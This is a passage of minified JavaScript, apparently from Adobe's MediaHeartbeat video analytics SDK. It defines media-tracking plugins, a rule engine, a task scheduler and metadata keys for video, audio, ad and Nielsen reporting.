state."),!1):i.__super__._canProcess.call(this)},i.prototype._cmdVideoLoad=function(e){this._errorInfo=null},i.prototype._cmdVideoStart=function(e){this._logger.debug(this._logTag,"#_cmdVideoStart()"),this._canProcess()&&this._workQueue.addCommand(new c(this._executeOpen,this,[e]))},i.prototype._cmdAdStart=function(e){this._logger.debug(this._logTag,"#_cmdAdStart()"),this._canProcess()&&this._workQueue.addCommand(new c(this._executeOpenAd,this,[e]))},i.prototype._cmdHeartbeatPluginError=function(e){this._errorInfo||(this._errorInfo=new u("Internal error","HeartbeatPlugin is in ERROR state."),this._trigger(T,this._errorInfo),this._delegate&&this._delegate.onError(this._errorInfo))},i.prototype._track=function(e){try{if(!this._appMeasurement.visitorOptedOut){var t=this._appMeasurement.linkTrackVars;this._appMeasurement.linkTrackVars="",this._appMeasurement.track(e),this._appMeasurement.linkTrackVars=t}}catch(e){this._logger.warn(this._logTag,"appMeasurement.track() call threw an exception.")}},i.prototype._executeOpen=function(e){if(this._logger.debug(this._logTag,"#_executeOpen(id="+e.videoId+", videoName="+e.videoName+", mediaType="+e.mediaType+", streamType="+e.streamType+", length="+e.videoLength+", playerName="+e.playerName+", channel="+e.channel+", isPrimetime="+e.isPrimetime+", sessionId="+e.sessionId+")"),this._canProcess()&&this._inputDataValidator.validateFields(e,["videoId","mediaType","streamType","videoLength","playerName"])){var t={};for(var a in e.metaVideo)e.metaVideo.hasOwnProperty(a)&&(t[a]=e.metaVideo[a]);if(e.metaNielsen)for(var a in e.metaNielsen)e.metaNielsen.hasOwnProperty(a)&&(t[a]=e.metaNielsen[a]);t["a.contentType"]=e.streamType,t["a.media.name"]=e.videoId,t["a.media.friendlyName"]=e.videoName||"",t["a.media.length"]=Math.floor(e.videoLength)||"0",t["a.media.playerName"]=e.playerName,t["a.media.channel"]=e.channel||"",t["a.media.view"]=!0,t["a.media.vsid"]=e.sessionId;var o={};o.contextData=t,"audio"===e.mediaType?(o.pev3=D,o.ms_a="1"):o.pev3=S,o.pe=e.isPrimetime?C:P,this._track(o);var i=this;setTimeout((function(){i._trigger(N,e)}),0)}},i.prototype._executeOpenAd=function(e){var t=g(e.videoId)+"_"+e.podPosition;if(this._logger.debug(this._logTag,"#_executeOpenAd(id="+e.adId+", mediaType="+e.mediaType+", streamType="+e.streamType+", length="+e.adLength+", podPlayerName="+e.podPlayerName+", parentId="+e.videoId+", podId="+t+", parentPodPosition="+e.adPosition+", podSecond="+e.podSecond+")"),this._canProcess()&&this._inputDataValidator.validateFields(e,["videoId","mediaType","streamType","playerName","adId","adLength","podPlayerName","adPosition"])){e.podSecond=null==e.podSecond||isNaN(e.podSecond)?e.playhead:e.podSecond;var a={};for(o in e.metaVideo)e.metaVideo.hasOwnProperty(o)&&(a[o]=e.metaVideo[o]);for(o in e.metaAd)e.metaAd.hasOwnProperty(o)&&(a[o]=e.metaAd[o]);if(e.metaNielsen)for(var o in e.metaNielsen)e.metaNielsen.hasOwnProperty(o)&&(a[o]=e.metaNielsen[o]);a["a.contentType"]=e.streamType,a["a.media.name"]=e.videoId,a["a.media.playerName"]=e.playerName,a["a.media.channel"]=e.channel||"",a["a.media.vsid"]=e.sessionId,a["a.media.friendlyName"]=e.videoName||"",a["a.media.length"]=Math.floor(e.videoLength)||"0",a["a.media.ad.name"]=e.adId,a["a.media.ad.friendlyName"]=e.adName||"",a["a.media.ad.podFriendlyName"]=e.podName||"",a["a.media.ad.length"]=Math.floor(e.adLength)||"0",a["a.media.ad.playerName"]=e.podPlayerName,a["a.media.ad.pod"]=t,a["a.media.ad.podPosition"]=Math.floor(e.adPosition)||"0",a["a.media.ad.podSecond"]=Math.floor(e.podSecond)||"0",a["a.media.ad.view"]=!0;var i={};i.contextData=a,"audio"===e.mediaType?(i.pev3=I,i.ms_a="1"):i.pev3=E,i.pe=e.isPrimetime?L:A,this._track(i);var r=this;setTimeout((function(){r._trigger(q,e)}),0)}},i.prototype._setupDataResolver=function(){var e={},t=this;e.rsid=function(){return t._appMeasurement.account},e.tracking_server=function(){return t._appMeasurement.ssl&&t._appMeasurement.trackingServerSecure?t._appMeasurement.trackingServerSecure:t._appMeasurement.trackingServer},e.ssl=function(){return t._appMeasurement.ssl},e.vid=function(){return t._appMeasurement.visitorID},e.aid=function(){return t._appMeasurement.analyticsVisitorID},e.mid=function(){return t._appMeasurement.marketingCloudVisitorID},e.blob=function(){return t._appMeasurement.audienceManagerBlob},e.loc_hint=function(){return t._appMeasurement.audienceManagerLocationHint?parseInt(t._appMeasurement.audienceManagerLocationHint):""},e.customerIDs=function(){var e={},a=t._appMeasurement.visitor.getCustomerIDs();for(var o in a)if(a.hasOwnProperty(o)){var i=a[o];if("object"==typeof i){for(var r in i)i.hasOwnProperty(r)&&("authState"==r?e[o+".as"]=i[r]:e[o+"."+r]=i[r]);e[o+".as"]||(e[o+".as"]="0")}}return e},e.visitorOptedOut=function(){return!!t._appMeasurement.visitorOptedOut},e.channel=function(){return t._config?t._config.channel:null},e.meta=function(e){var a=e.split(".");if(a.length<2)return null;var o=a.shift();switch(e=a.join("."),o){case"video":return e==d.WILDCARD?t._videoMetadata:t._videoMetadata[e];case"ad":return e==d.WILDCARD?t._adMetadata:t._adMetadata[e];case"chapter":return e==d.WILDCARD?t._chapterMetadata:t._chapterMetadata[e];default:return null}},this._dataResolver=function(t){if(!t||0==t.length)return null;for(var a=null,o=0;o<t.length;o++){var i=t[o];a=a||{},p.startsWith(i,"meta.")?a[i]=e.meta(i.split("meta.")[1]):a[i]=e.hasOwnProperty(i)?e[i].call(this):null}return a}},i.prototype._registerCommands=function(){this._pluginManager.comply(this,"handleVideoLoad",this._cmdVideoLoad),this._pluginManager.comply(this,"handleVideoStart",this._cmdVideoStart),this._pluginManager.comply(this,"handleAdStart",this._cmdAdStart),this._pluginManager.comply(this,"handleHeartbeatPluginError",this._cmdHeartbeatPluginError)},i.prototype._registerBehaviours=function(){this._pluginManager.registerBehaviour(new r(b,x),this,"handleVideoLoad"),this._pluginManager.registerBehaviour(new r(b,j),this,"handleVideoStart",[new s(b,"video.id","videoId"),new s(b,"video.mediaType","mediaType"),new s(b,"video.streamType","streamType"),new s(b,"video.name","videoName"),new s(b,"video.length","videoLength"),new s(b,"video.playerName","playerName"),new s(b,"video.streamType","streamType"),new s(w,"is_primetime","isPrimetime"),new s(w,"session_id","sessionId"),new s(v,"channel","channel"),new s(v,"meta.video.*","metaVideo"),new s(f,"meta","metaNielsen")]),this._pluginManager.registerBehaviour(new r(b,V),this,"handleAdStart",[new s(b,"video.id","videoId"),new s(b,"video.mediaType","mediaType"),new s(b,"video.streamType","streamType"),new s(b,"video.playhead","playhead"),new s(b,"video.playerName","playerName"),new s(b,"video.name","videoName"),new s(b,"video.length","videoLength"),new s(b,"ad.id","adId"),new s(b,"ad.length","adLength"),new s(b,"ad.position","adPosition"),new s(b,"ad.name","adName"),new s(b,"pod.name","podName"),new s(b,"pod.position","podPosition"),new s(b,"pod.playerName","podPlayerName"),new s(b,"pod.startTime","podSecond"),new s(w,"is_primetime","isPrimetime"),new s(w,"session_id","sessionId"),new s(v,"channel","channel"),new s(v,"meta.video.*","metaVideo"),new s(v,"meta.ad.*","metaAd"),new s(f,"meta","metaNielsen")]),this._pluginManager.registerBehaviour(new r(w,T),this,"handleHeartbeatPluginError")},i.prototype._onAppMeasurementReady=function(){this._logger.debug(this._logTag,"[Init] #_onAppMeasurementReady"),this._workQueue.resume()};var y="adobe-analytics",v=y,f="nielsen",b="player",w="adobe-heartbeat",k=2e3,T="error",S="video",E="videoAd",D="audio",I="audioAd",P="ms_s",C="msp_s",A="msa_s",L="mspa_s",N="aa_start",q="sc_ad_start",x="video_load",j="video_start",V="ad_start";o.AdobeAnalyticsPlugin=i}(e.ADB.core,e.ADB.va,e.ADB.va.utils,t),function(e){"use strict";e.VideoMetadataKeys={SHOW:"a.media.show",SEASON:"a.media.season",EPISODE:"a.media.episode",ASSET_ID:"a.media.asset",GENRE:"a.media.genre",FIRST_AIR_DATE:"a.media.airDate",FIRST_DIGITAL_DATE:"a.media.digitalDate",RATING:"a.media.rating",ORIGINATOR:"a.media.originator",NETWORK:"a.media.network",SHOW_TYPE:"a.media.type",AD_LOAD:"a.media.adLoad",MVPD:"a.media.pass.mvpd",AUTHORIZED:"a.media.pass.auth",DAY_PART:"a.media.dayPart",FEED:"a.media.feed",STREAM_FORMAT:"a.media.format"},e.AudioMetadataKeys={ARTIST:"a.media.artist",ALBUM:"a.media.album",LABEL:"a.media.label",AUTHOR:"a.media.author",STATION:"a.media.station",PUBLISHER:"a.media.publisher"},e.AdMetadataKeys={ADVERTISER:"a.media.ad.advertiser",CAMPAIGN_ID:"a.media.ad.campaign",CREATIVE_ID:"a.media.ad.creative",PLACEMENT_ID:"a.media.ad.placement",SITE_ID:"a.media.ad.site",CREATIVE_URL:"a.media.ad.creativeURL"}}(t),e.ADB.va.plugins.aa||(e.ADB.va.plugins.aa=t)}(this),function(e){!function(e,t){"use strict";function a(){this._processAction=!0,this._store={}}function o(e){if(!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e,this._rules=[]}a.prototype.setRuleName=function(e){this._ruleName=e},a.prototype.getRuleName=function(e,t){return this._ruleName},a.prototype.setData=function(e,t){this._store[e]=t},a.prototype.getData=function(e){return this._store[e]},a.prototype.shouldProcessAction=function(){return this._processAction},a.prototype.stopProcessingAction=function(){this._processAction=!1},a.prototype.startProcessingAction=function(){this._processAction=!0},o.createContext=function(){return new a},o.createPredicate=function(e,t,a){return{fn:e,expectedValue:t,msg:a}},o.prototype.registerRule=function(e,t,a,o,i){this._rules.push({name:e,desc:t,preconditions:a,actions:o,scope:i})},o.prototype.registerEnterExitAction=function(e,t){this._enterAction=e,this._exitAction=t},o.prototype._handleFailure=function(e,t){this._logger.error(i,e.desc+" -  "+t.msg)},o.prototype._getRule=function(e){for(var t=0;t<this._rules.length;++t)if(this._rules[t].name===e)return this._rules[t];return null},o.prototype.processRule=function(e,t){var a=!0,r=this._getRule(e);if(r){var n=r.scope;t||(t=o.createContext()),t.setRuleName(e);for(var s=!1,d=0;d<r.preconditions.length;++d){var c=r.preconditions[d];if(s=!!c.fn.call(n,t)!==c.expectedValue){this._handleFailure(r,c);break}}if(s)a=!1;else{t.startProcessingAction(),this._enterAction&&this._enterAction.call(n,t);for(d=0;d<r.actions.length;++d){var l=r.actions[d];if(!t.shouldProcessAction()){this._logger.info(i,"Stopping actions for "+r.desc);break}l.call(n,t)}this._exitAction&&t.shouldProcessAction()&&this._exitAction.call(n,t)}}else this._logger.warn(i,"No registered event found for ruleName "+e),a=!1;return a};var i="RuleEngine";t._RuleEngine=o}(e.ADB.core,e.ADB.va),function(e,t){"use strict";function a(e,t,a){this.taskFn=e,this.scope=t,this.interval=a,this.remainingInterval=a}function o(e){if(!e)throw new Error("Reference to the logger object cannot be NULL");this._logger=e,this._tasks=[],this._pausedTasks=[]}a.prototype.elapsedTime=function(e){this.remainingInterval-=e},a.prototype.shouldExecute=function(){return this.remainingInterval<=0},a.prototype.execute=function(){this.taskFn.call(this.scope)},o.prototype._getCurrentTimeInMS=function(){return(new Date).getTime()},o.prototype._runTasksForTime=function(e){var t=[],a=e-this._lastTickTime;this._lastTickTime=e;for(var o=0;o<this._tasks.length;){var i=this._tasks[o];i.elapsedTime(a),i.shouldExecute()?(t.push(i),this._tasks.splice(o,1)):++o}this._checkStopTimer();for(o=0;o<t.length;++o)t[o].execute()},o.prototype._onTick=function(){var e=this._getCurrentTimeInMS();this._runTasksForTime(e)},o.prototype._startTimer=function(){var e=this;this._timer||(this._logger.info(i,"#startTimer()"),e._lastTickTime=this._getCurrentTimeInMS(),this._timer=window.setInterval((function(){e._onTick()}),r))},o.prototype._stopTimer=function(){this._timer&&(this._logger.info(i,"#stopTimer()"),window.clearInterval(this._timer),this._timer=null)},o.prototype._checkStartTimer=function(){this._tasks.length>0&&this._startTimer()},o.prototype._checkStopTimer=function(){0===this._tasks.length&&this._stopTimer()},o.prototype._removeTask=function(e,t){for(var a=0;a<e.length;++a)if(e[a]===t)return e.splice(a,1),!0;return!1},o.prototype.scheduleTask=function(e,t,o){if(this._logger.info(i,"#scheduleTask()"),!e)throw new Error("Reference to the taskFn cannot be NULL");var r=new a(e,t,o);return this._tasks.push(r),this._checkStartTimer(),r},o.prototype.cancelTask=function(e){this._logger.info(i,"#cancelTask()"),this._removeTask(this._tasks,e),this._checkStopTimer()},o.prototype.pauseTask=function(e){this._logger.info(i,"#pauseTask()"),this._removeTask(this._tasks,e)&&this._pausedTasks.push(e),this._checkStopTimer()},o.prototype.resumeTask=function(e){this._logger.info(i,"#resumeTask()"),this._removeTask(this._pausedTasks,e)&&this._tasks.push(e),this._checkStartTimer()},o.prototype.clearTasks=function(){this._stopTimer(),this._tasks=[],this._pausedTasks=[]};var i="TaskScheduler",r=250;t._TaskScheduler=o}(e.ADB.core,e.ADB.va),function(e){"use strict";function t(){this.trackingServer=void 0,this.channel=void 0,this.ovp=void 0,this.appVersion=void 0,this.playerName=void 0,this.ssl=!1,this.debugLogging=!1}e.MediaHeartbeatConfig=t,e.MediaHeartbeatConfig.sharedInstance=new t}(e.ADB.va),function(e){"use strict";function t(){this.data={}}var a=e.plugins.videoplayer.VideoInfo,o=e.plugins.videoplayer.AdBreakInfo,i=e.plugins.videoplayer.AdInfo,r=e.plugins.videoplayer.ChapterInfo,n=e.plugins.videoplayer.QoSInfo;t.MEDIAINFO_KEY_NAME="a.name",t.MEDIAINFO_KEY_VIDEOID="a.videoId",t.MEDIAINFO_KEY_ADID="a.adId",t.MEDIAINFO_KEY_LENGTH="a.length",t.MEDIAINFO_KEY_PLAYHEAD="a.playhead",t.MEDIAINFO_KEY_MEDIATYPE="a.mediaType",t.MEDIAINFO_KEY_STREAMTYPE="a.streamType",t.MEDIAINFO_KEY_POSITION="a.position",t.MEDIAINFO_KEY_STARTTIME="a.startTime",t.MEDIAINFO_KEY_BITRATE="a.bitrate",t.MEDIAINFO_KEY_FPS="a.fps",t.MEDIAINFO_KEY_DROPPEDFRAMES="a.droppedFrames",t.MEDIAINFO_KEY_STARTUPTIME="a.startupTime",t.MEDIAINFO_KEY_TIMEDMETADATA="a.timedMetadata",t.prototype.setValue=function(e,t){this.data[e]=t},t.prototype.getValue=function(e){return this.data.hasOwnProperty(e)?this.data[e]:null},t.prototype.createVideoInfo=function(){var e=new a;return e.id=null!=this.getValue(t.MEDIAINFO_KEY_VIDEOID)?this.getValue(t.MEDIAINFO_KEY_VIDEOID):"",e.name=null!=this.getValue(t.MEDIAINFO_KEY_NAME)?this.getValue(t.MEDIAINFO_KEY_NAME):"",e.length=null!=this.getValue(t.MEDIAINFO_KEY_LENGTH)?this.getValue(t.MEDIAINFO_KEY_LENGTH):0,e.playhead=null!=this.getValue(t.MEDIAINFO_KEY_PLAYHEAD)?this.getValue(t.MEDIAINFO_KEY_PLAYHEAD):0,e.mediaType=null!=this.getValue(t.MEDIAINFO_KEY_MEDIATYPE)?this.getValue(t.MEDIAINFO_KEY_MEDIATYPE):"",e.streamType=null!=this.getValue(t.MEDIAINFO_KEY_STREAMTYPE)?this.getValue(t.MEDIAINFO_KEY_STREAMTYPE):"",e},t.prototype.createAdBreakInfo=function(){var e=new o;return e.name=null!=this.getValue(t.MEDIAINFO_KEY_NAME)?this.getValue(t.MEDIAINFO_KEY_NAME):"",e.position=null!=this.getValue(t.MEDIAINFO_KEY_POSITION)?this.getValue(t.MEDIAINFO_KEY_POSITION):0,e.startTime=null!=this.getValue(t.MEDIAINFO_KEY_STARTTIME)?this.getValue(t.MEDIAINFO_KEY_STARTTIME):0,e},t.prototype.createAdInfo=function(){var e=new i;return e.id=null!=this.getValue(t.MEDIAINFO_KEY_ADID)?this.getValue(t.MEDIAINFO_KEY_ADID):"",e.name=null!=this.getValue(t.MEDIAINFO_KEY_NAME)?this.getValue(t.MEDIAINFO_KEY_NAME):"",e.length=null!=this.getValue(t.MEDIAINFO_KEY_LENGTH)?this.getValue(t.MEDIAINFO_KEY_LENGTH):0,e.position=null!=this.getValue(t.MEDIAINFO_KEY_POSITION)?this.getValue(t.MEDIAINFO_KEY_POSITION):0,e},t.prototype.createChapterInfo=function(){var e=new r;return e.name=null!=this.getValue(t.MEDIAINFO_KEY_NAME)?this.getValue(t.MEDIAINFO_KEY_NAME):"",e.length=null!=this.getValue(t.MEDIAINFO_KEY_LENGTH)?this.getValue(t.MEDIAINFO_KEY_LENGTH):0,e.startTime=null!=this.getValue(t.MEDIAINFO_KEY_STARTTIME)?this.getValue(t.MEDIAINFO_KEY_STARTTIME):0,e.position=null!=this.getValue(t.MEDIAINFO_KEY_POSITION)?this.getValue(t.MEDIAINFO_KEY_POSITION):0,e},t.prototype.createQoSInfo=function(){var e=new n;return e.bitrate=null!=this.getValue(t.MEDIAINFO_KEY_BITRATE)?this.getValue(t.MEDIAINFO_KEY_BITRATE):0,e.fps=null!=this.getValue(t.MEDIAINFO_KEY_FPS)?this.getValue(t.MEDIAINFO_KEY_FPS):0,e.droppedFrames=null!=this.getValue(t.MEDIAINFO_KEY_DROPPEDFRAMES)?this.getValue(t.MEDIAINFO_KEY_DROPPEDFRAMES):0,e.startupTime=null!=this.getValue(t.MEDIAINFO_KEY_STARTUPTIME)?this.getValue(t.MEDIAINFO_KEY_STARTUPTIME):0,e},t.prototype.isEqual=function(e){if(this===e)return!0;if(!e||"object"!=typeof e||"function"!=typeof e.getValue)return!1;for(var a=[t.MEDIAINFO_KEY_NAME,t.MEDIAINFO_KEY_VIDEOID,t.MEDIAINFO_KEY_ADID,t.MEDIAINFO_KEY_LENGTH,t.MEDIAINFO_KEY_PLAYHEAD,t.MEDIAINFO_KEY_STREAMTYPE,t.MEDIAINFO_KEY_MEDIATYPE,t.MEDIAINFO_KEY_POSITION,t.MEDIAINFO_KEY_STARTTIME,t.MEDIAINFO_KEY_BITRATE,t.MEDIAINFO_KEY_FPS,t.MEDIAINFO_KEY_DROPPEDFRAMES,t.MEDIAINFO_KEY_STARTUPTIME,t.MEDIAINFO_KEY_TIMEDMETADATA],o=0;o<a.length;++o){var i=a[o];if(this.getValue(i)!==e.getValue(i))return!1}return!0},e.MediaObject=t}(e.ADB.va),function(e,t){"use strict";function a(e){a.__super__.constructor.call(this),this._heartbeat=e}function o(e){o.__super__.constructor.call(this),this._heartbeat=e}function i(e){i.__super__.constructor.call(this),this._heartbeat=e}function r(e){r.__super__.constructor.call(this),this._heartbeat=e}e.extend(a,t.plugins.aa.AdobeAnalyticsPluginDelegate),a.prototype.onError=function(e){this._heartbeat&&this._heartbeat._onDelegateError(e)},e.extend(o,t.plugins.ah.AdobeHeartbeatPluginDelegate),o.prototype.onError=function(e){this._heartbeat&&this._heartbeat._onDelegateError(e)},o.prototype.onTrackingDisabled=function(){this._heartbeat&&this._heartbeat._disableHBTracking()},e.extend(i,t.HeartbeatDelegate),i.prototype.onError=function(e){this._heartbeat&&this._heartbeat._onDelegateError(e)},e.extend(r,t.plugins.videoplayer.VideoPlayerPluginDelegate),r.prototype.getVideoInfo=function(){return this._heartbeat&&this._heartbeat._videoInfo?(this._heartbeat._delegate&&(this._heartbeat._videoInfo.playhead=this._heartbeat._delegate.getCurrentPlaybackTime()),this._heartbeat._videoInfo):null},r.prototype.getAdBreakInfo=function(){return this._heartbeat&&this._heartbeat._adBreakInfo?this._heartbeat._adBreakInfo:null},r.prototype.getAdInfo=function(){return this._heartbeat&&this._heartbeat._adInfo?this._heartbeat._adInfo:null},r.prototype.getChapterInfo=function(){return this._heartbeat&&this._heartbeat._chapterInfo?this._heartbeat._chapterInfo:null},r.prototype.getQoSInfo=function(){if(this._heartbeat&&this._heartbeat._delegate&&this._heartbeat._delegate.getQoSObject()){var e=this._heartbeat._delegate.getQoSObject();if(e&&"object"==typeof e&&e.setValue)return e.createQoSInfo()}return null},t._MediaAnalyticsPluginDelegate=a,t._MediaHeartbeatPluginDelegate=o,t._ADBMediaHeartbeatDelegate=i,t._MediaHeartbeatVideoPlayerPluginDelegate=r}(e.ADB.core,e.ADB.va),function(e,t){"use strict";function a(e,o){a.__super__.constructor.call(this),this._heartbeat=e,this._logger=o,this._validator=new t.plugins.nielsen.MetadataValidator(o)}var o="MediaHeartbeatNielsenPluginDelegate",i={NielsenContentMetadata:"media_nielsen_content_metadata",NielsenChannelMetadata:"media_nielsen_channel_metadata",NielsenAdMetadata:"media_nielsen_ad_metadata"};t.plugins.nielsen&&e.extend(a,t.plugins.nielsen.NielsenPluginDelegate),a.prototype.getMetadataInfo=function(){if(this._heartbeat&&this._heartbeat._currentMediaObject){var e=this._heartbeat._currentMediaObject.getValue(i.NielsenContentMetadata);if(e&&"object"==typeof e)return this._validator.validateContentMetadata(e,"MediaHeartbeat.NielsenContentMetadataKeys"),e;this._logger.warn(o,"We expect a valid object for MediaHeartbeat.MediaObjectKey.NielsenContentMetadata in MediaObject")}return null},a.prototype.getAdMetadataInfo=function(){if(this._heartbeat&&this._heartbeat._currentAdObject){var e=this._heartbeat._currentAdObject.getValue(i.NielsenAdMetadata);if(e&&"object"==typeof e)return this._validator.validateAdMetadata(e,"MediaHeartbeat.NielsenAdMetadataKeys"),e;this._logger.warn(o,"We expect a valid object for MediaHeartbeat.MediaObjectKey.NielsenAdMetadata in MediaObject")}return null},a.prototype.getChannelInfo=function(){if(this._heartbeat&&this._heartbeat._currentMediaObject){var e=this._heartbeat._currentMediaObject.getValue(i.NielsenChannelMetadata);if(e&&"object"==typeof e)return this._validator.validateChannelMetadata(e,"MediaHeartbeat.NielsenChannelMetadataKeys"),e;this._logger.warn(o,"We expect a valid object for MediaHeartbeat.MediaObjectKey.NielsenChannelMetadata in MediaObject")}return null},a.prototype.onError=function(e){this._heartbeat&&this._heartbeat._onDelegateError(e)},t.plugins.nielsen&&(t._NielsenObjectKey=i,t._NielsenPluginDelegate=a)}(e.ADB.core,e.ADB.va),function(t,a){"use strict";function o(){}function i(t,o,i){if(this._appMeasurement=i||e.s,!this._appMeasurement)throw new Error("MediaHeartbeat needs a valid AppMeasurement instance.");if(!this._appMeasurement.visitor||!this._appMeasurement.visitor.marketingCloudOrgID)throw new Error("MediaHeartbeat needs a valid visitor instance with marketingCloudOrgId set.");if(!t)throw new Error("MediaHeartbeat needs a valid delegate object.");if(!o||"object"!=typeof o||!o.trackingServer)throw new Error("MediaHeartbeat needs a valid config object with trackingServer set.");this._config=o,this._delegate=t,this._debugLogging=a.MediaHeartbeat._debugLogging||this._config.debugLogging,this._logger=new r,this._debugLogging?this._logger.enable():this._logger.disable(),this._ruleEngine=new f(this._logger),this._taskScheduler=new b(this._logger),this._resetState(),this._setupRules()}var r=t.Logger,n=a.MediaObject,s=a.Heartbeat,d=a.HeartbeatConfig,c=a._ADBMediaHeartbeatDelegate,l=a.plugins.videoplayer.VideoPlayerPlugin,u=a.plugins.videoplayer.VideoPlayerPluginConfig,g=a._MediaHeartbeatVideoPlayerPluginDelegate,p=a.plugins.aa.AdobeAnalyticsPlugin,m=a.plugins.aa.AdobeAnalyticsPluginConfig,_=a._MediaAnalyticsPluginDelegate,h=a.plugins.ah.AdobeHeartbeatPlugin,y=a.plugins.ah.AdobeHeartbeatPluginConfig,v=a._MediaHeartbeatPluginDelegate,f=a._RuleEngine,b=a._TaskScheduler,w=a.utils.ObjectUtils,k=a.utils.VersionUtils;if(o.prototype.getCurrentPlaybackTime=function(){return null},o.prototype.getQoSObject=function(){return null},i.MediaType={Video:"video",Audio:"audio"},i.Event={AdBreakStart:"adBreakStart",AdBreakComplete:"adBreakComplete",AdStart:"adStart",AdComplete:"adComplete",AdSkip:"adSkip",ChapterStart:"chapterStart",ChapterComplete:"chapterComplete",ChapterSkip:"chapterSkip",SeekStart:"seekStart",SeekComplete:"seekComplete",BufferStart:"bufferStart",BufferComplete:"bufferComplete",BitrateChange:"bitrateChange",TimedMetadataUpdate:"timedMetadataUpdate"},i.StreamType={VOD:"vod",LIVE:"live",LINEAR:"linear",PODCAST:"podcast",AUDIOBOOK:"audiobook",AOD:"aod"},i.MediaObjectKey={StandardVideoMetadata:"media_standard_content_metadata",StandardMediaMetadata:"media_standard_content_metadata",StandardAdMetadata:"media_standard_ad_metadata",VideoResumed:"resumed",MediaResumed:"resumed",PrerollTrackingWaitingTime:"preroll_tracking_waiting_time"},i.VideoMetadataKeys=a.plugins.aa.VideoMetadataKeys,i.AudioMetadataKeys=a.plugins.aa.AudioMetadataKeys,i.AdMetadataKeys=a.plugins.aa.AdMetadataKeys,i.createMediaObject=function(e,t,a,o,r){var s=new n;s.setValue(n.MEDIAINFO_KEY_VIDEOID,t),s.setValue(n.MEDIAINFO_KEY_NAME,e),s.setValue(n.MEDIAINFO_KEY_LENGTH,a),s.setValue(n.MEDIAINFO_KEY_PLAYHEAD,0);var d=o||i.StreamType.VOD;return s.setValue(n.MEDIAINFO_KEY_STREAMTYPE,d),("string"!=typeof r||r!=i.MediaType.Video&&r!=i.MediaType.Audio)&&(r=i.MediaType.Video),s.setValue(n.MEDIAINFO_KEY_MEDIATYPE,r),s},i.createAdBreakObject=function(e,t,a){var o=new n;return o.setValue(n.MEDIAINFO_KEY_NAME,e),o.setValue(n.MEDIAINFO_KEY_POSITION,t),o.setValue(n.MEDIAINFO_KEY_STARTTIME,a),o},i.createAdObject=function(e,t,a,o){var i=new n;return i.setValue(n.MEDIAINFO_KEY_NAME,e),i.setValue(n.MEDIAINFO_KEY_ADID,t),i.setValue(n.MEDIAINFO_KEY_POSITION,a),i.setValue(n.MEDIAINFO_KEY_LENGTH,o),i},i.createChapterObject=function(e,t,a,o){var i=new n;return i.setValue(n.MEDIAINFO_KEY_NAME,e),i.setValue(n.MEDIAINFO_KEY_POSITION,t),i.setValue(n.MEDIAINFO_KEY_LENGTH,a),i.setValue(n.MEDIAINFO_KEY_STARTTIME,o),i},i.createQoSObject=function(e,t,a,o){var i=new n;return i.setValue(n.MEDIAINFO_KEY_BITRATE,e),i.setValue(n.MEDIAINFO_KEY_FPS,a),i.setValue(n.MEDIAINFO_KEY_DROPPEDFRAMES,o),i.setValue(n.MEDIAINFO_KEY_STARTUPTIME,t),i},i.createTimedMetadataObject=function(e){var t=new n;return t.setValue(n.MEDIAINFO_KEY_TIMEDMETADATA,e),t},i.version=function(){return a.Version.getVersion()},i.prototype.trackSessionStart=function(e,t){this._logger.info(P,"#::trackSessionStart()");var a=f.createContext();a.setData(C,e),a.setData(x,this._cleanContextData(t)),this._processRule(D.SessionStart,a)},i.prototype.trackPlay=function(){this._logger.info(P,"#::trackPlay()"),this._processRule(D.Play)},i.prototype.trackPause=function(){this._logger.info(P,"#::trackPause()"),this._processRule(D.Pause)},i.prototype.trackComplete=function(){this._logger.info(P,"#::trackComplete()"),this._processRule(D.VideoComplete)},i.prototype.trackSessionEnd=function(){this._logger.info(P,"#::trackSessionEnd()"),this._processRule(D.SessionEnd)},i.prototype.trackError=function(e){this._logger.info(P,"#::trackError()");var t=f.createContext();t.setData(j,e),this._processRule(D.Error,t)},i.prototype.trackEvent=function(e,t,a){this._logger.info(P,"#::trackEvent() - "+e);var o,r=f.createContext();switch(e){case i.Event.AdBreakStart:r.setData(A,t),r.setData(x,this._cleanContextData(a)),o=D.AdBreakStart;break;case i.Event.AdBreakComplete:o=D.AdBreakComplete;break;case i.Event.AdStart:r.setData(L,t),r.setData(x,this._cleanContextData(a)),o=D.AdStart;break;case i.Event.AdComplete:o=D.AdComplete;break;case i.Event.AdSkip:o=D.AdSkip;break;case i.Event.SeekStart:o=D.SeekStart;break;case i.Event.SeekComplete:o=D.SeekComplete;break;case i.Event.ChapterStart:r.setData(N,t),r.setData(x,this._cleanContextData(a)),o=D.ChapterStart;break;case i.Event.ChapterComplete:o=D.ChapterComplete;break;case i.Event.ChapterSkip:o=D.ChapterSkip;break;case i.Event.BufferStart:o=D.BufferStart;break;case i.Event.BufferComplete:o=D.BufferComplete;break;case i.Event.BitrateChange:o=D.BitrateChange;break;case i.Event.TimedMetadataUpdate:o=D.TimedMetadataUpdate,r.setData(q,t);break;default:return void this._logger.error(P,"Incorrect event name.")}this._processRule(o,r)},a.plugins.nielsen){var T=a.MediaHeartbeatConfig;T.prototype.nielsenConfigKey=void 0,T.prototype.nielsenAppInfo=void 0;var S=a._NielsenObjectKey;i.MediaObjectKey.NielsenContentMetadata=S.NielsenContentMetadata,i.MediaObjectKey.NielsenAdMetadata=S.NielsenAdMetadata,i.MediaObjectKey.NielsenChannelMetadata=S.NielsenChannelMetadata,i.NielsenContentMetadataKeys=a.plugins.nielsen.ContentMetadataKeys,i.NielsenChannelMetadataKeys=a.plugins.nielsen.ChannelMetadataKeys,i.NielsenAdMetadataKeys=a.plugins.nielsen.AdMetadataKeys,i.prototype.nielsenLoadMetadata=function(e){this._nielsenPlugin&&this._nielsenPlugin.loadMetadata(e)}}i.prototype._setState=function(e,t){this._mediaState[e]=t},i.prototype._isInState=function(e){return this._mediaState[e]},i.prototype._isTrackingDisabled=function(e){return this._mediaHeartbeatDisabled},i.prototype._isInSession=function(e){return this._isInState(E.Session)},i.prototype._isInMedia=function(e){return this._isInState(E.Media)},i.prototype._isInAd=function(e){return this._isInState(E.Ad)},i.prototype._isInAdBreak=function(e){return this._isInState(E.AdBreak)},i.prototype._isInChapter=function(e){return this._isInState(E.Chapter)},i.prototype._isInPlay=function(e){return this._isInState(E.PlayPause)},i.prototype._isInPause=function(e){return!this._isInState(E.PlayPause)},i.prototype._isInBuffer=function(e){return this._isInState(E.Buffer)},i.prototype._isInSeek=function(e){return this._isInState(E.Seek)},i.prototype._isPlatformTrackingSupported=function(e){return!this._appMeasurement.unsupportedBrowser},i.prototype._isAudioTrackingSupported=function(e){return 